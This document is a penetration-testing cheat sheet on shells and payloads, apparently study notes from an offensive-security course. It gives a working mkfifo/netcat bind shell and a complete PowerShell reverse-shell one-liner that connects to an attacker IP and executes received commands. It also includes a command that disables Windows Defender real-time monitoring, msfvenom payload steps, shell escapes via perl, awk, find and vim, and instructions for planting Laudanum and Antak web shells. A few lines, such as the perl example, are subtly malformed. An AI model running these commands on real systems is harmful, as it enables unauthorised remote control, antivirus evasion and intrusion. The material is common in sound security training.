# SHELL & PAYLOADS

## Shell Basics

###### Bind Shell

- With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).

```bash
# on target
nc -lvnp <Port>

# Pwnbox
nc -nv <Target-IP> <Port>


# Bind shell ( on target )
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <Port> > /tmp/f

# Bind shell pwnbox
nc -nv <Target-IP> <Port>
```

###### Reverse Shells
- With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

```bash
# Attack box
sudo nc -lvnp <443| Port>

# target windows cmd 
    # run
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<Attack-IP>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    # disable AV if problem
    Set-MpPreference -DisableRealtimeMonitoring $true
```

**Ressource**

[Reverse shell Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Payloads 

###### Automating Payloads & Delivery with Metasploit

###### Crafting Payloads with MSFvenom
```bash
# 1 - create payload 
msfvenom -p <Payload-Path> LHOST=<My-IP> LPORT=<Port> -f <Payload-Format> > <output-File.Format>

# 2 - send to target 

# 3 - Execute on Attack machine 
sudo nc -lvnp <Port>

# 4 - execute on target
```

**Ressources**

[Nishang Project](https://github.com/samratashok/nishang/blob/master/)

## Windows Shells

##### Infiltrating Windows

###### Payload Types to Consider

- DLLs

- Batch

- VBS

- MSI

- Powershell

###### Payload Generation

- [MSFVenom + Msfconsole](https://github.com/rapid7/metasploit-framework)

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)

- [Nishang](https://github.com/samratashok/nishang)

- [Darkamour](https://github.com/bats3c/darkarmour)

###### Payload Transfer and Execution

- [Impacket](https://github.com/fortra/impacket) :  psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server....

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)

- Remote execution via MSF

- SMB

- FTP, TFTP, HTTP/S and others

`MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016`


## NIX Shells
##### Infiltrating Unix/Linux


When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:  

-  What distribution of Linux is the system running?

- What shell & programming languages exist on the system?

- What function is the system serving for the network environment it is on?

- What application is the system hosting?

- Are there any known vulnerabilities?

**Ressources**

- [WSL to run payloads in order to bypass windows antivirus](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/)

##### Spawning Interactive Shells

```bash
# shell interactive mode
/bin/sh -i

# Perl to Shell
perl —e 'exec "/bin/sh";' | perl: exec "/bin/sh";

# Ruby to shell
ruby: exec "/bin/sh"

# Lua to Shell
lua: os.execute('/bin/sh')

# AWK to shell
awk 'BEGIN {system("/bin/sh")}'

# Find to shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# vim to shell
vim -c ':!/bin/sh'
# vim escape 
vim
:set shell=/bin/sh
:shell

# Execution Permissions Considerations
ls -la <path/to/fileorbinary>
sudo -l
```

## Web Shells

##### Laudanum, One Webshell to Rule Them All

- Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.
- in Parrot os : `/usr/share/webshells/laudanum`

- Usage 

```bash
# 1 - Add target to /etc/hosts

# 2 - move copy for modification
cp </usr/share/webshells/laudanum/aspx/shell.aspx| linnk-to-laudanum-webshell> </home/tester/demo.aspx | new-file-name>

# 3 - put my ip in the file
```

**Ressources**
[Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)

##### Antak Webshell

- Antak is a web shell built-in ASP.Net included within the Nishang project. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest.
    Antak on Parrot : `ls /usr/share/nishang/Antak-WebShell`


```bash
# 1 - Add target to /etc/hosts

# 2 - move copy for modification
cp </usr/share/nishang/Antak-WebShell/antak.aspx | linnk-to-antak-webshell> </home/administrator/Upload.aspx | new-file-name>

# 3 - modify the file for useclear
# ligne 14 : set user and  password
```

## PHP Web Shells
**Ressources**
[WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
## Ressources

- [IPPSEC website to learn concepts](https://ippsec.rocks/?#)

